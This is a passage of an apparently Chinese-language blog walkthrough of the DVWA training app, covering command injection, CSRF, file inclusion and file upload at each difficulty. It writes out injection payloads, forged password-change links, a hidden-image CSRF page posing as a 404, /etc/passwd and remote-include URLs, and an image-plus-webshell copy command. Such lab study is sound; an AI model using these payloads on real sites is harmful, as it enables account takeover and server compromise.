class="hljs-title function_ invoke__">execute</span>();<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br>    <span class="hljs-comment">// If its a valid login...</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$account_locked</span> == <span class="hljs-literal">false</span> ) ) &#123;<br>        <span class="hljs-comment">// Get users details</span><br>        <span class="hljs-variable">$avatar</span>       = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;avatar&#x27;</span> ];<br>        <span class="hljs-variable">$failed_login</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ];<br>        <span class="hljs-variable">$last_login</span>   = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ];<br><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="hljs-subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br><br>        <span class="hljs-comment">// Had the account been locked out since last login?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$failed_login</span> &gt;= <span class="hljs-variable">$total_failed_login</span> ) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="hljs-subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Reset bad login count</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-title function_ invoke__">sleep</span>( <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );<br><br>        <span class="hljs-comment">// Give the user some feedback</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="hljs-subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;<br><br>        <span class="hljs-comment">// Update bad login count</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    &#125;<br><br>    <span class="hljs-comment">// Set the last login time</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这一次的源码要长很多，看起来很安全，分析一下。</p><p>这次限制了登录的失败次数为3，锁定的时间默认为15分钟（实际是last_login+lockout_time）。</p><p>如果超过了3次失败，账户将会锁定。</p><p>并且添加了pdo机制，爆破和sql注入看起来很艰难。</p><p>但总觉得可能会有爆破的方式，尝试去网上查找，最后在知乎找到了一篇<a href="https://zhuanlan.zhihu.com/p/126639909">大佬的文章</a>，我也跟着做了一遍，结果失败了，暂未找到失败的原因。</p><h1 id="三、command-injection（命令注入）"><a href="#三、command-injection（命令注入）" class="headerlink" title="三、command injection（命令注入）"></a>三、command injection（命令注入）</h1><p>以前比较擅长这个（因为简单），太久没搞了，复习一下。</p><blockquote><p><strong>命令执行</strong>是指攻击者通过浏览器或者其他客户端软件提交一些cmd命令（或者bash命令）至服务器程序，服务器程序通过system、eval、exec等函数直接或者间接地调用cmd.exe执行攻击者提交的命令。          </p></blockquote><p>界面：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629100902545.png" alt="image-20210629100902545"></p><h2 id="1-low-1"><a href="#1-low-1" class="headerlink" title="1.low"></a>1.low</h2><p>输入框提示输入ip地址，标题写着ping a device，很明显是ping命令。</p><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629101516837.png" alt="image-20210629101516837"></p><p>查看源码发现没有任何过滤，输入ip后会ping4次包，命令。</p><p>使用连接符，可以让输入执行几条命令。</p><blockquote><p><strong>常见连接符</strong></p><p>A;B    先执行A，再执行B<br>A&amp;B    简单拼接，A B之间无制约关系<br>A|B    显示B的执行结果<br>A&amp;&amp;B   A执行成功，然后才会执行B<br>A||B   A执行失败，然后才会执行B</p></blockquote><p>尝试查看当前目录文件：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-comment">;ls</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629102717387.png" alt="image-20210629102717387"></p><p>查看上一层目录文件：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">;<span class="hljs-keyword">ls</span> <span class="hljs-string">../</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629102807547.png" alt="image-20210629102807547"></p><p>还有一些其他的命令都可以执行。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#当前用户名<br>;whoami<br>#查看文件<br>;cat xxx<br>#查看版本<br>;uname -a<br></code></pre></td></tr></table></figure><h2 id="2-medium-1"><a href="#2-medium-1" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629104132920.png" alt="image-20210629104132920"></p><p>源码对一些符号做了过滤，&amp;&amp;和;会被过滤掉。</p><p>但其他的连接符仍旧可以使用，例如|、||、&amp;。</p><h2 id="3-high-1"><a href="#3-high-1" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629104639549.png" alt="image-20210629104639549"></p><p>对大部分的符号进行了过滤，很奇怪并没有过滤字符串。</p><p>这里还有个很离奇的点，过滤的符号不是｜而是｜+空格，所以仍旧可以使用｜做连接符。</p><p>但这样的题目总让人感觉怪怪的。</p><h2 id="4-impossible-1"><a href="#4-impossible-1" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629110648951.png" alt="image-20210629110648951"></p><p>又是要检查token，防止csrf。</p><p>传入的参数以.为分割，并检测是否为数字，检测成功后重新再组成ip地址。</p><p>看起来是很难有方法能够绕过了。</p><h1 id="四、csrf（跨站请求伪造）"><a href="#四、csrf（跨站请求伪造）" class="headerlink" title="四、csrf（跨站请求伪造）"></a>四、csrf（跨站请求伪造）</h1><blockquote><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p><p>CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p></blockquote><h2 id="1-low-2"><a href="#1-low-2" class="headerlink" title="1.low"></a>1.low</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629114943931.png" alt="image-20210629114943931"></p><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629115142907.png" alt="image-20210629115142907"></p><p>get两个值，判断password_new和password_conf是否相等，相等则在数据库更新当前用户的密码。</p><p>没有其他的验证机制。</p><p><strong>构造链接：</strong></p><p><a href="http://127.0.0.1/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#">http://127.0.0.1/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#</a></p><p>只要访问这个链接，密码就会被改成111。</p><p>不过这个链接太明显了，可以使用<strong>短链接</strong>进行伪装。</p><p>也可以选择构造攻击页面去诱导受害者访问。</p><blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;[http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#](http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#)&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span> <br>  <br>————————<br> 来源：https://www.jianshu.com/p/e65ede7d7026<br></code></pre></td></tr></table></figure></blockquote><h2 id="2-medium-2"><a href="#2-medium-2" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629120339916.png" alt="image-20210629120339916"></p><p>eregi（）函数是用指定的模式搜索一个字符串中指定的字符串，如果匹配成功返回true，反之返回false。</p><p>关于<code>if( eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] ) )</code>:</p><blockquote><p>百度百科：</p><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p></blockquote><p><strong>$_SERVER[‘HTTP_REFERER’]</strong> 就是链接到当前页面的前一页面的 URL 地址，也就是源地址。 </p><p>**$_SERVER[‘SERVER_NAME’]**则为主机名（例如127.0.0.1），也就是受害者的ip。</p><p>所以是检查源地址中是否包含主机名，所以构造的url必须要包含主机名。</p><p>和low一样，先更改密码形成链接。</p><p>然后换一个浏览器打开链接，显示request不正确。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629142330630.png" alt="image-20210629142330630"></p><details><summary><p>对比在原页面和新页面抓包到的内容，确实有不同，新页面并没有referer。</p></summary><p>原：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629143700817.png" alt="image-20210629143700817"></p><p>新：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629143829526.png" alt="image-20210629143829526"></p></details><p>因为eregi（）验证为false所以导致出现错误。</p><p>所以写一个攻击页面。</p><p><strong>文件名和内部链接的ip均为被攻击的ip</strong>（例如127.0.0.1）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=3333&amp;password_conf=3333&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>访问，出现了迷惑性质的提示。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170441299.png" alt="image-20210629170441299"></p><p>尝试用修改的密码登录，成功！</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170724287.png" alt="image-20210629170724287"></p><h2 id="3-high-2"><a href="#3-high-2" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170830488.png" alt="image-20210629170830488"></p><p>增加了token的验证。</p><p>先提交修改一下密码，url出现了token，结合源码，应该是要验证token是否相同。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630103301622.png" alt="image-20210630103301622"></p><p>必须要获得用户的token，再提交表单，这一点看上去很难搞。</p><p>经过了一番查询后发现，居然可以用xss结合起来，使用xss获得用户的token。</p><p>这个等到xss高级的时候再一起来看吧。</p><h2 id="4-impossible-2"><a href="#4-impossible-2" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>界面增加了原来密码的验证。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630114602196.png" alt="image-20210630114602196"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_current&#x27;</span> ];<br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Sanitise current password input</span><br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_curr</span> );<br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$pass_curr</span> );<br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_curr</span> );<br><br>    <span class="hljs-comment">// Check that the current password is correct</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_curr</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><br>    <span class="hljs-comment">// Do both new passwords match and does the current password match the user?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &amp;&amp; ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) ) &#123;<br>        <span class="hljs-comment">// It does!</span><br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_new</span> );<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$pass_new</span> );<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update database with new password</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_new</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>直接要求验证原密码+token验证，攻击者不知道原密码就没法子csrf。</p><h1 id="五、file-inclusion（文件包含）"><a href="#五、file-inclusion（文件包含）" class="headerlink" title="五、file inclusion（文件包含）"></a>五、file inclusion（文件包含）</h1><p>文件包含介绍：</p><blockquote><p><strong>文件包含</strong></p><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><p><strong>漏洞产生原因</strong></p><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p></blockquote><p>界面：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630141520524.png" alt="image-20210630141520524"></p><p>有三个文件。</p><p>File1:用户名、ip</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142212280.png" alt="image-20210630142212280"></p><p>File2:</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142309828.png" alt="image-20210630142309828"></p><p>File3:存在很多敏感信息。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142350352.png" alt="image-20210630142350352"></p><p>File4:隐藏文件。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630144247278.png" alt="image-20210630144247278"></p><h2 id="1-low-3"><a href="#1-low-3" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142723198.png" alt="image-20210630142723198"></p><p>url：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi/?page=include.php<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi/?page=file1.php<br></code></pre></td></tr></table></figure><p>源码很简单，直接get指定的文件名赋值给file，没有任何防护。</p><p>尝试访问passwd文件，也是可行的。（访问敏感信息）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630144703536.png" alt="image-20210630144703536"></p><p>甚至可以远程包含。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi<span class="hljs-regexp">/?page=http:/</span><span class="hljs-regexp">/xx.xx.xx.xx/</span><span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><h2 id="2-medium-3"><a href="#2-medium-3" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630153408797.png" alt="image-20210630153408797"></p><p>http:&#x2F;&#x2F;和https:&#x2F;&#x2F; 被str_replace过滤。</p><p>..&#x2F;和..\也被过滤。</p><p>但str_replace只能过滤一次，所以可以使用双写绕过。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630154941333.png" alt="image-20210630154941333"></p><p>本地文件&#x2F;etc&#x2F;passwd仍旧可以访问。</p><h2 id="3-high-3"><a href="#3-high-3" class="headerlink" title="3.high"></a>3.high</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630155430279.png" alt="image-20210630155430279"></p><p>fnmatch（）函数是根据指定的模式来匹配文件名和字符串。</p><p>意思是必须file开头的文件和include.php。</p><p>也就意味着可以使用file:&#x2F;&#x2F;协议（关于<a href="https://www.php.net/manual/zh/wrappers.php.php">php伪协议</a>）。</p><p>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi<span class="hljs-regexp">/?page=file:/</span><span class="hljs-regexp">//</span>etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630162308195.png" alt="image-20210630162308195"></p><p>但file协议无法支持远程文件执行，只可以进行本地文件读取。</p><h2 id="4-impossible-3"><a href="#4-impossible-3" class="headerlink" title="4.impossible"></a>4.impossible</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630163051152.png" alt="image-20210630163051152"></p><p>直接限制文件，只能是include.php、file1-3.php。</p><h1 id="六、file-upload（文件上传）"><a href="#六、file-upload（文件上传）" class="headerlink" title="六、file upload（文件上传）"></a>六、file upload（文件上传）</h1><h2 id="1-low-4"><a href="#1-low-4" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630170841603.png" alt="image-20210630170841603"></p><p>没有任何过滤机制。</p><p>尝试上传文件，成功。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630170815030.png" alt="image-20210630170815030"></p><h2 id="2-medium-4"><a href="#2-medium-4" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630171124024.png" alt="image-20210630171124024"></p><p>会检查文件的类型，只有<strong>content-type</strong>为image&#x2F;jpeg和image&#x2F;png会成功上传，并且大小要小于100000。</p><p>但对文件的后缀和内容完全没有检测。</p><p>上传php文件，抓包，修改content-type为白名单的类型名。</p><p>显示上传成功。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630171633004.png" alt="image-20210630171633004"></p><p>访问一下，可以正常访问。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630172124237.png" alt="image-20210630172124237"></p><h2 id="3-high-4"><a href="#3-high-4" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630172245715.png" alt="image-20210630172245715"></p><p>strrpos（）返回指定字符最后一次出现的位置。</p><p>以文件名最后一个点切割文件名，检测文件名后缀是否为<strong>jpg</strong>或<strong>jpeg</strong>或<strong>png</strong>。</p><p>看到这个我第一反应就是00截断。</p><p>尝试着上传了一个命名为1.jpg但内容为111的文件，显示上传失败。上传普通的图片却可以成功。</p><p>仔细看了下，原来是有<strong>getimagesize（）</strong>，该函数会检查图片的类型大小。</p><p>所以使用copy拼接马与图片。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">copy /<span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">a</span>.jpg+<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.php</span> c.jpg<br></code></pre></td></tr></table></figure><p>而00截断也因为php实验版本环境过高而无法展开，所以直接上传jpg文件，使用。</p><p>file uoload的high等级并没有限制file:&#x2F;&#x2F;协议，所以文件引用后用菜刀或蚁剑对其进行连接。</p><h2 id="4-impossible-4"><a href="#4-impossible-4" class="headerlink" title="4.impossible"></a>4.impossible</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 